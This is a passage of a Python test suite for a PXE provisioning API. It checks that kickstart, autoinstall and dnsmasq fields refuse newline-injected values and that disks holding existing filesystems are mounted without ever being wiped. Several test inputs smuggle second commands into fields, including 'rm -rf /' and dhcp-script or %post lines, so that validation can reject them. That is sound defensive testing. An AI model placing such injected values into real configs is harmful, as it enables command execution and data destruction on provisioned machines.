    net_config 走 PxeNetConfigIn，而**模板保存**这边一个都没有 —— 于是"保存能过、
    生成/部署期才 4xx"，而注入点恰恰在后面那一步（值会被拼进 kickstart / autoinstall /
    dnsmasq.conf 的注释行，全都以换行分隔行）。
    """

    @staticmethod
    def _client():
        from fastapi import FastAPI
        from fastapi.testclient import TestClient

        from app.api import pxe as pxe_api
        from app.core.auth import get_current_user
        from app.database import get_db
        app = FastAPI()
        app.include_router(pxe_api.router, prefix="/api/it/pxe")
        app.dependency_overrides[get_current_user] = lambda: {
            "id": "t", "username": "t", "display_name": "t", "role": "admin"}
        # 校验在进端点前完成，非法 payload 走不到 DB
        app.dependency_overrides[get_db] = lambda: None
        return TestClient(app)

    def _post(self, **kw):
        body = {"name": "t", "os_type": "ubuntu", "admin_password": "Test@123"}
        body.update(kw)
        r = self._client().post("/api/it/pxe/profiles", json=body)
        self.assertEqual(r.status_code, 422, r.text)
        return json.dumps(r.json()["detail"], ensure_ascii=False)

    def test_deploy_mode_injection_is_rejected_at_save_time(self):
        detail = self._post(deploy_mode="standalone\ndhcp-script=/tmp/evil")
        self.assertIn("deploy_mode", detail)

    def test_unknown_deploy_mode_is_rejected(self):
        self.assertIn("deploy_mode", self._post(deploy_mode="magic"))

    def test_single_line_fields_reject_control_chars(self):
        for field in ("timezone", "locale", "keyboard", "os_version", "mirror",
                      "http_root", "kernel_path", "initrd_path", "squashfs_path",
                      "name", "remark"):
            with self.subTest(field=field):
                detail = self._post(**{field: "val\n%post\n  evil"})
                self.assertIn(field, detail)

    def test_list_fields_reject_control_chars(self):
        self.assertIn("ssh_keys", self._post(ssh_keys=["ssh-rsa AAA\nrm -rf /"]))
        self.assertIn("extra_packages", self._post(extra_packages=["curl\n%post"]))

    def test_server_ip_and_net_mode_are_validated(self):
        self.assertIn("server_ip", self._post(server_ip="not-an-ip"))
        self.assertIn("net_mode", self._post(net_mode="magic"))

    def test_net_config_goes_through_the_same_model(self):
        detail = self._post(net_config={"interface": "eth0\nport=0"})
        self.assertIn("net_config", detail)
        self.assertIn("interface", detail)
        self.assertIn("net_config", self._post(net_config={"gateway": "10.0.0.256"}))

    def test_post_script_stays_multi_line(self):
        """post_script 是**多行**字段（运维要贴多行脚本），必须仍然放行。"""
        from app.core.schemas import PxeProfileIn
        p = PxeProfileIn(name="t", os_type="ubuntu",
                         post_script="#!/bin/bash\napt-get update -y\nsystemctl restart ssh\n")
        self.assertIn("apt-get update", p.post_script)

    def test_valid_single_line_values_still_pass(self):
        """合法值一个都不能被误伤（含中文名、点分地址、正常 URL）。"""
        from app.core.schemas import PxeProfileIn
        p = PxeProfileIn(name="华灿-边缘节点", os_type="ubuntu", os_version="22.04.3",
                         timezone="Asia/Shanghai", locale="en_US.UTF-8", keyboard="us",
                         mirror="http://10.0.0.1/pxe/serve/repo",
                         server_ip="10.128.118.113",
                         http_root="http://10.128.118.113:8000/pxe/serve",
                         deploy_mode="proxy", net_mode="STATIC")
        self.assertEqual(p.deploy_mode, "proxy")
        self.assertEqual(p.net_mode, "static")       # 归一化
        self.assertEqual(p.name, "华灿-边缘节点")

    def test_net_config_stays_a_plain_dict_with_unknown_keys(self):
        """net_config 必须仍然是普通 dict（要存 JSON、生成器按 .get() 消费），

        前端静态场景发的 interface/ip/netmask/gateway/dns 五个键一个都不能丢。
        """
        from app.core.schemas import PxeProfileIn
        raw = {"interface": "ens33", "ip": "10.0.0.5", "netmask": "255.255.255.0",
               "gateway": "10.0.0.1", "dns": ["8.8.8.8"]}
        p = PxeProfileIn(name="t", os_type="ubuntu", net_mode="static", net_config=raw)
        self.assertIsInstance(p.net_config, dict)
        self.assertEqual(p.net_config, raw)

    def test_generate_and_profile_agree_on_deploy_mode(self):
        """两层白名单必须同口径：generate 接受的三值 == 保存接受的三值。"""
        from app.core.schemas import PxeGenerateIn, PxeProfileIn
        for mode in ("standalone", "proxy", "relay"):
            with self.subTest(mode=mode):
                self.assertEqual(PxeProfileIn(name="t", deploy_mode=mode).deploy_mode, mode)
                self.assertEqual(PxeGenerateIn(deploy_mode=mode).deploy_mode, mode)
        for bad in ("magic", "STANDALONE", "proxy "):
            with self.subTest(bad=bad):
                with self.assertRaises(ValueError):
                    PxeProfileIn(name="t", deploy_mode=bad)
                with self.assertRaises(ValueError):
                    PxeGenerateIn(deploy_mode=bad)


class ExistingFilesystemMountTest(unittest.TestCase):
    """功能 G：挂载数据盘上**已有**的文件系统（不新建分区、不格式化）。

    依据是 pykickstart 3.78 的**原文**（我下载源码核对过，见 RUNBOOK §5.74）：
      · `part` 命令说明："All partitions created will be formatted as part of the
        installation process unless ``--noformat`` and ``--onpart`` are used."
      · `--noformat`："Tells the installation program not to format the partition, for
        use with the ``--onpart`` command."
      · `--onpart`："Put the partition on an already existing device. Use
        ``--onpart=LABEL=name`` or ``--onpart=UUID=name`` to specify a partition by label
        or uuid respectively." + "it is safer to use labels than absolute partition names."
    ⇒ 用 UUID/LABEL 定位，产物里**不出现设备名**（与 §5.42「设备名不是身份」同口径）。

    这条特性最危险的地方不是"挂不上"，而是**为了挂上而把盘放进了会被清空的集合**：
    anaconda 的 `ignoredisk --only-use` 决定"哪些盘可见"，`clearpart --drives` 决定
    "哪些盘会被清"。挂既有文件系统的盘必须**可见**（否则它的分区根本不在设备树里，
    `--onpart` 找不到），但**绝不能被清**。所以下面对这两条逐字断言。
    """

    PARTS = [{"mount": "/boot", "size": "1G", "fstype": "ext4"},
             {"mount": "/", "size": "rest", "fstype": "ext4"}]
    UUID = "1b2c3d4e-5f60-4718-9a0b-1c2d3e4f5061"

    def _rhel(self, dc, os_type="rhel"):
        import importlib
        m = importlib.import_module("tests.test_pxe")
        kw = dict(disk_config=dc, os_type=os_type)
        if os_type == "rhel":
            kw.update(os_version="9", mirror="http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        else:
            kw.update(os_version="22.04", mirror="")
        return m._cfg(**kw)

    def _dc(self, dd):
        """custom + disk_config.wipe=true（有 clearpart）—— 最容易抹错盘的组合。"""
        return {"target": {"mode": "auto"}, "layout": "custom", "wipe": True,
                "partitions": self.PARTS, "data_disks": [dd]}

    @staticmethod
    def _part_line(ks):
        """取出 ks 里那一行 `part … --onpart=…`。"""
        lines = [l for l in ks.splitlines() if "--onpart=" in l]
        assert len(lines) == 1, lines
        return lines[0]

    def test_uuid_mount_uses_onpart_noformat(self):
        from app.it.pxe.generator import generate_all
        ks = generate_all(self._rhel(self._dc(
            {"name": "sdc", "size": "30G", "mount": "/data",
             "existing_uuid": self.UUID})))["ks.cfg"]
        line = self._part_line(ks)
        self.assertEqual(line.strip(), "part /data --onpart=UUID=%s --noformat" % self.UUID)
        # 这条行里**不能**出现 --ondisk/--fstype（既有的文件系统不重新格式化）
        self.assertNotIn("--ondisk", line)
        self.assertNotIn("--fstype", line)

    def test_label_mount_is_supported_too(self):
        from app.it.pxe.generator import generate_all
        ks = generate_all(self._rhel(self._dc(
            {"name": "sdc", "size": "30G", "mount": "/data",
             "existing_label": "DATA-2026"})))["ks.cfg"]
        self.assertEqual(self._part_line(ks).strip(),
                         "part /data --onpart=LABEL=DATA-2026 --noformat")

    def test_fstype_is_passed_through_when_given_but_never_invented(self):
        """`--fstype` 是否必需，pykickstart 文档**没说** ⇒ 不替运维猜，但也不拦。

        我最初按"不格式化 ⇒ fstype 没意义 ⇒ 给了就拒"写，拿到官方文档原文后**推翻了自己**：
        文档对该组合下 --fstype 的作用一个字都没有。既然"必需"和"无用"都证不了，
        就给一个可用表达方式（拦住可能让人装不上），并保证"给了必定出现在产物里"（不静默丢）。
        """
        from app.it.pxe.generator import generate_all
        dd = {"name": "sdc", "size": "30G", "mount": "/data",
              "existing_uuid": self.UUID, "fstype": "xfs"}
        ks = generate_all(self._rhel(self._dc(dd)))["ks.cfg"]
        self.assertEqual(self._part_line(ks).strip(),
                         "part /data --fstype=xfs --onpart=UUID=%s --noformat" % self.UUID)
        # 没给就不写（绝不替运维猜一个文件系统类型出来）
        ks2 = generate_all(self._rhel(self._dc(
            {"name": "sdc", "size": "30G", "mount": "/data",
             "existing_uuid": self.UUID})))["ks.cfg"]
        self.assertNotIn("--fstype", self._part_line(ks2))

    def test_logical_partition_boundary_is_written_into_the_artifact(self):
        """官方明写的边界：用了 clearpart 时 `--onpart` 不能指向**逻辑分区**。

        原文（pykickstart clearpart 一节）："If the clearpart command is used, then the
        --onpart command cannot be used on a logical partition."
        生成期拿不到"那块盘上的分区是主分区还是逻辑分区"，所以不许静默 ——
        必须把这条边界写进产物，让运维在装之前就看见。
        """
        from app.it.pxe.generator import generate_all
        ks = generate_all(self._rhel(self._dc(
            {"name": "sdc", "size": "30G", "mount": "/data",
             "existing_uuid": self.UUID})))["ks.cfg"]
        self.assertIn("logical partition", ks)
        self.assertIn("主分区", ks)

    def test_disk_is_visible_but_never_cleared(self):
        """★ 这条是本特性的安全红线，不是"顺手断言"。"""
        from app.it.pxe.generator import generate_all
        ks = generate_all(self._rhel(self._dc(
            {"name": "sdc", "size": "30G", "mount": "/data",
             "existing_uuid": self.UUID})))["ks.cfg"]
        # 可见：进了 --only-use（并且是按 %pre 反解出来的设备名，不是写死的盘名）
        self.assertIn("ignoredisk --only-use=$target,$ddev1", ks)
        # 不可清：clearpart 只有目标盘
        self.assertIn("clearpart --drives=$target --all --initlabel", ks)
        self.assertNotIn("clearpart --drives=$target,$ddev1", ks)
        # 反解护栏在（解不出来就中止，不会"按猜的盘挂"）
        self.assertIn("ddev1=$(lsblk", ks)
        self.assertIn("existing_uuid", ks)          # %pre 日志里点名是哪条声明

    def test_wipe_disk_and_existing_disk_together_stay_apart(self):
        """同时有"要格式化的数据盘"和"要保留的数据盘"时，两个集合不能串。"""
        from app.it.pxe.generator import generate_all
        dc = {"target": {"mode": "auto"}, "layout": "custom", "wipe": True,
              "partitions": self.PARTS,
              "data_disks": [{"name": "sdc", "size": "30G", "mount": "/data",
                              "fstype": "xfs", "wipe": True},
                             {"name": "sdd", "size": "60G", "mount": "/keep",
                              "existing_uuid": self.UUID}]}
        ks = generate_all(self._rhel(dc))["ks.cfg"]
        self.assertIn("ignoredisk --only-use=$target,$ddev1,$ddev2", ks)
        self.assertIn("clearpart --drives=$target,$ddev1 --all --initlabel", ks)
        self.assertIn("--ondisk=$ddev1", ks)                       # 被格式化的那块
        self.assertIn("part /keep --onpart=UUID=%s --noformat" % self.UUID, ks)

    def test_name_mode_uses_the_given_name_and_skips_pre_resolution(self):
        from app.it.pxe.generator import generate_all
        dc = {"target": {"mode": "name", "name": "sda"}, "layout": "custom", "wipe": True,
              "partitions": self.PARTS,
              "data_disks": [{"name": "sdc", "size": "30G", "mount": "/data",
                              "existing_uuid": self.UUID}]}
        ks = generate_all(self._rhel(dc))["ks.cfg"]
        self.assertNotIn("ddev1=", ks)
        self.assertIn("ignoredisk --only-use=sda,sdc", ks)
        self.assertIn("clearpart --drives=sda --all --initlabel", ks)
        self.assertIn("part /data --onpart=UUID=%s --noformat" % self.UUID, ks)

    def test_generator_rejects_contradictions_and_unsupported_combos(self):
        """生成器侧也必须拦（库里读出来的老配置绕过 schema 的那条路）。"""
        from app.it.pxe.generator import generate_all
        cases = [
            ("缺 mount", {"name": "sdc", "size": "30G", "existing_uuid": self.UUID},
             "必须同时给出 mount"),
            ("与 wipe=true 矛盾", {"name": "sdc", "size": "30G", "mount": "/data",
                                   "existing_uuid": self.UUID, "wipe": True},
             "互相矛盾"),
            ("uuid 与 label 同时给", {"name": "sdc", "size": "30G", "mount": "/data",
                                      "existing_uuid": self.UUID, "existing_label": "L"},
             "只能给一个"),
            ("数值非法字符", {"name": "sdc", "size": "30G", "mount": "/data",
                              "existing_uuid": "AB CD;rm -rf /"},
             "含非法字符"),
            ("mode=name 无盘名", {"size": "30G", "mount": "/data",
                                  "existing_uuid": self.UUID},
             "必须给出盘名"),
            ("非 custom 布局", {"name": "sdc", "size": "30G", "mount": "/data",
                                "existing_uuid": self.UUID},
             "只有 layout=custom 才生成"),
        ]
        for label, dd, needle in cases:
            with self.subTest(case=label):
                dc = self._dc(dd)
                if label == "mode=name 无盘名":
                    dc["target"] = {"mode": "name", "name": "sda"}
                if label == "非 custom 布局":
                    # 非 custom 时**不能**再给 partitions（那是另一条更早的拒绝），
                    # 这里要考的是"非 custom + existing_*"这条。
                    dc["layout"] = "lvm"
                    dc.pop("partitions", None)
                with self.assertRaises(ValueError) as ctx:
                    generate_all(self._rhel(dc))
                self.assertIn(needle, str(ctx.exception), label)

    def test_ubuntu_is_fail_closed_because_unverified(self):
        """Ubuntu 侧：**读实现验过**（§5.80）之后仍然拒绝 —— 因为 curtin 的 partition 条目
        要求既有分区的 size/offset（生成期拿不到），而不是"没试过"。
        """
        from app.it.pxe.generator import generate_all
        dc = self._dc({"name": "sdc", "size": "30G", "mount": "/data",
                       "existing_uuid": self.UUID})
        with self.assertRaises(ValueError) as ctx:
            generate_all(self._rhel(dc, os_type="ubuntu"))
        self.assertIn("表达不出来", str(ctx.exception))

    def test_schema_rejects_the_same_things_with_field_path(self):
        """保存期（schema）就要 422 并点名字段，别让运维"保存成功、生成被拒"。"""
        from fastapi import FastAPI
        from fastapi.testclient import TestClient

        from app.api import pxe as pxe_api
        from app.core.auth import get_current_user
        from app.database import get_db
        app = FastAPI()
        app.include_router(pxe_api.router, prefix="/api/it/pxe")
        app.dependency_overrides[get_current_user] = lambda: {
            "id": "t", "username": "t", "display_name": "t", "role": "admin"}
        app.dependency_overrides[get_db] = lambda: None
        client = TestClient(app)

        base = {"layout": "custom", "wipe": True, "partitions": self.PARTS}
        cases = [
            ("缺 mount", {"name": "sdc", "size": "30G", "existing_uuid": self.UUID},
             "existing_uuid"),
            ("与 wipe 矛盾", {"name": "sdc", "size": "30G", "mount": "/data",
                              "existing_uuid": self.UUID, "wipe": True},
             "wipe"),
            ("两个都给", {"name": "sdc", "size": "30G", "mount": "/data",
                          "existing_uuid": self.UUID, "existing_label": "L"},
             "只能给一个"),
            ("非法字符", {"name": "sdc", "size": "30G", "mount": "/data",
                          "existing_uuid": "AB CD"},
             "含非法字符"),
            ("无盘名", {"size": "30G", "mount": "/data", "existing_uuid": self.UUID},
             "name"),
            ("缺稳定匹配条件", {"name": "sdc", "mount": "/data",
                                "existing_uuid": self.UUID},
             "稳定匹配条件"),
        ]
        for label, dd, needle in cases:
            with self.subTest(case=label):
                dc = dict(base, data_disks=[dd])
                r = client.post("/api/it/pxe/profiles", json={
                    "name": "x", "os_type": "rhel", "os_version": "9",
                    "mirror": "http://mirror.example/rocky/9/BaseOS/x86_64/os/",
                    "admin_password": "Test@123", "disk_config": dc})
                self.assertEqual(r.status_code, 422, r.text)
                self.assertIn(needle, json.dumps(r.json()["detail"], ensure_ascii=False), label)

    def test_schema_accepts_the_supported_combination(self):
        """正例：rhel + custom + 稳定匹配条件 + 盘名 + mount + existing_uuid ⇒ 通过。"""
        from app.core.schemas import PxeProfileIn
        p = PxeProfileIn(name="ok", os_type="rhel", os_version="9",
                         mirror="http://mirror.example/rocky/9/BaseOS/x86_64/os/",
                         disk_config=self._dc(
                             {"name": "sdc", "size": "30G", "mount": "/data",
                              "existing_uuid": self.UUID}))
        dd = p.disk_config["data_disks"][0]
        self.assertEqual(dd["existing_uuid"], self.UUID)

    def test_ubuntu_schema_rejection_mentions_why(self):
        """保存期就要 422，并且说明**为什么**（读实现得到的理由：需要既有分区的 size/offset）。"""
        from app.core.schemas import PxeProfileIn
        with self.assertRaises(ValueError) as ctx:
            PxeProfileIn(name="u", os_type="ubuntu", os_version="22.04",
                         disk_config=self._dc(
                             {"name": "sdc", "size": "30G", "mount": "/data",
                              "existing_uuid": self.UUID}))
        msg = str(ctx.exception)
        self.assertIn("表达不出来", msg)
        self.assertIn("offset", msg)

    def test_no_regression_for_plain_data_disks(self):
        """没有 existing_* 的老配置：产物必须与改动前一致（不受影响）。"""
        from app.it.pxe.generator import generate_all
        ks = generate_all(self._rhel(self._dc(
            {"name": "sdc", "size": "30G", "fstype": "xfs"})))["ks.cfg"]
        self.assertNotIn("--onpart", ks)
        self.assertIn("ignoredisk --only-use=$target", ks)
        self.assertIn("clearpart --drives=$target --all --initlabel", ks)
